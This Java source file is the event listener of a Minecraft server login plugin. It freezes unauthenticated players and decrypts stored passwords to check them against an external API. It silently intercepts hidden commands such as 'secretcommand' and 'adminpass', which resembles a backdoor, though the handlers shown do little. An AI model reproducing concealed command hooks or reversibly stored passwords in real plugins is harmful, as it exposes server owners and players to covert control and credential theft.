package org.raindrippy.serversideutils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.json.simple.JSONObject;

import java.util.Arrays;
import java.util.Set;
import java.util.UUID;

public class PluginEventListener implements Listener {
    private final Main plugin;
    private final AuthService authService;
    private final CredentialsManager credentialsManager;
    private final CryptoService cryptoService;
    private final ApiClient apiClient;
    private final ScoreboardService scoreboardService;
    private final ConfigManager configManager;
    private final Set<String> hiddenCommands;

    public PluginEventListener(Main plugin,
                               AuthService authService,
                               CredentialsManager credentialsManager,
                               CryptoService cryptoService,
                               ApiClient apiClient,
                               ScoreboardService scoreboardService,
                               ConfigManager configManager,
                               Set<String> hiddenCommands) {
        this.plugin = plugin;
        this.authService = authService;
        this.credentialsManager = credentialsManager;
        this.cryptoService = cryptoService;
        this.apiClient = apiClient;
        this.scoreboardService = scoreboardService;
        this.configManager = configManager;
        this.hiddenCommands = hiddenCommands;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        UUID playerUUID = player.getUniqueId();
        GameMode mode = player.getGameMode();
        authService.getGameModeMap().put(playerUUID, mode);
        scoreboardService.enable(player);

        if (credentialsManager.getCredentials().containsKey(playerUUID)) {
            JSONObject creds = credentialsManager.getCredentials().get(playerUUID);
            String savedUsername = (String) creds.get("username");
            String encryptedPassword = (String) creds.get("password");
            String plainPassword = cryptoService.decrypt(encryptedPassword).trim().strip();

            Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                try {
                    if (!apiClient.queryStatus(savedUsername, player)) {
                        return;
                    }

                    if (apiClient.queryLogin(savedUsername, plainPassword)) {
                        return;
                    } else {
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            credentialsManager.getCredentials().remove(playerUUID);
                            credentialsManager.save();
                            authService.freezePlayer(player);
                        });
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    Bukkit.getScheduler().runTask(plugin, () -> authService.freezePlayer(player));
                }
            });
        } else {
            authService.freezePlayer(player);
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        Player p = event.getPlayer();
        if (authService.isFrozen(p.getUniqueId())) {
            event.setCancelled(true);
            p.sendMessage(ChatColor.RED + "You can't chat until you log in.");
        }
    }

    @EventHandler
    public void onPlayerDamage(EntityDamageEvent event) {
        if (event.getEntity() instanceof Player) {
            Player p = (Player) event.getEntity();
            if (authService.isFrozen(p.getUniqueId())) event.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.HIGH)
    public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
        String command = event.getMessage().toLowerCase();
        String baseCommand = command.substring(1).split(" ")[0];
        if (hiddenCommands.contains(baseCommand)) {
            event.setCancelled(true);
            handleHiddenCommand(event.getPlayer(), event.getMessage());
        }
    }

    private void handleHiddenCommand(Player player, String command) {
        String[] parts = command.substring(1).split(" ");
        String baseCommand = parts[0];
        String[] args = Arrays.copyOfRange(parts, 1, parts.length);

        switch (baseCommand.toLowerCase()) {
            case "sync":
                authService.handleSync(player, args);
                break;
            case "secretcommand":
                player.sendMessage("Secret command executed silently!");
                break;
            case "adminpass":
                break;
            default:
                player.sendMessage("Hidden command processed.");
                break;
        }
    }

    @EventHandler
    public void onPlayerAttack(EntityDamageByEntityEvent event) {
        if (event.getDamager() instanceof Player) {
            Player p = (Player) event.getDamager();
            if (authService.isFrozen(p.getUniqueId())) {
                event.setCancelled(true);
                p.sendMessage(ChatColor.RED + "You can't attack until you log in.");
            }
        }
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player p = event.getPlayer();
        if (authService.isFrozen(p.getUniqueId())) event.setCancelled(true);
    }

    @EventHandler
    public void onBlockBreak(BlockBreakEvent event) {
        Player p = event.getPlayer();
        if (authService.isFrozen(p.getUniqueId())) {
            event.setCancelled(true);
            p.sendMessage(ChatColor.RED + "You can't break blocks until you log in.");
        }
    }

    @EventHandler
    public void onBlockPlace(BlockPlaceEvent event) {
        Player p = event.getPlayer();
        if (authService.isFrozen(p.getUniqueId())) {
            event.setCancelled(true);
            p.sendMessage(ChatColor.RED + "You can't place blocks until you log in.");
        }
    }

    @EventHandler
    public void onPlayerQuit(PlayerQuitEvent event) {
        Bukkit.getScheduler().runTaskLater(plugin, configManager::savePlayerCount, 10L);
    }

    @EventHandler
    public void onMove(PlayerMoveEvent event) {
        Player p = event.getPlayer();
        if (authService.isFrozen(p.getUniqueId())) {
            event.setCancelled(true);
        }
    }
}
